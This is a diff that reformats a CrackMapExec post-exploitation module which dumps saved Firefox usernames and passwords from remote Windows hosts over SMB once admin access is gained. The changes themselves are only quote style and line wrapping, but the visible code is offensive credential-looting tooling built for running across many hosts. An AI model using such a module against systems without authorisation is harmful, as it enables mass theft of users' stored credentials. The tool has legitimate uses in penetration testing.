@@ -9,15 +9,16 @@ class CMEModule:
     Inspired by firefox looting from DonPAPI
     https://github.com/login-securite/DonPAPI
     """
-    name = 'firefox'
-    description = 'Dump credentials from Firefox'
-    supported_protocols = ['smb']
+
+    name = "firefox"
+    description = "Dump credentials from Firefox"
+    supported_protocols = ["smb"]
     opsec_safe = True  # Does the module touch disk?
     multiple_hosts = True  # Does it make sense to run this module on multiple hosts at a time?
 
     def options(self, context, module_options):
         """Dump credentials from Firefox"""
-        pass        
+        pass
 
     def on_admin_login(self, context, connection):
         host = connection.hostname + "." + connection.domain
@@ -48,6 +49,14 @@ class CMEModule:
             firefox_triage.upgrade_connection(connection=connection.conn)
             firefox_credentials = firefox_triage.run()
             for credential in firefox_credentials:
-                context.log.highlight("[%s][FIREFOX] %s %s:%s" % (credential.winuser, credential.url+' -' if credential.url != '' else '-', credential.username, credential.password))
+                context.log.highlight(
+                    "[%s][FIREFOX] %s %s:%s"
+                    % (
+                        credential.winuser,
+                        credential.url + " -" if credential.url != "" else "-",
+                        credential.username,
+                        credential.password,
+                    )
+                )
         except Exception as e:
             context.log.debug("Error while looting firefox: {}".format(e))
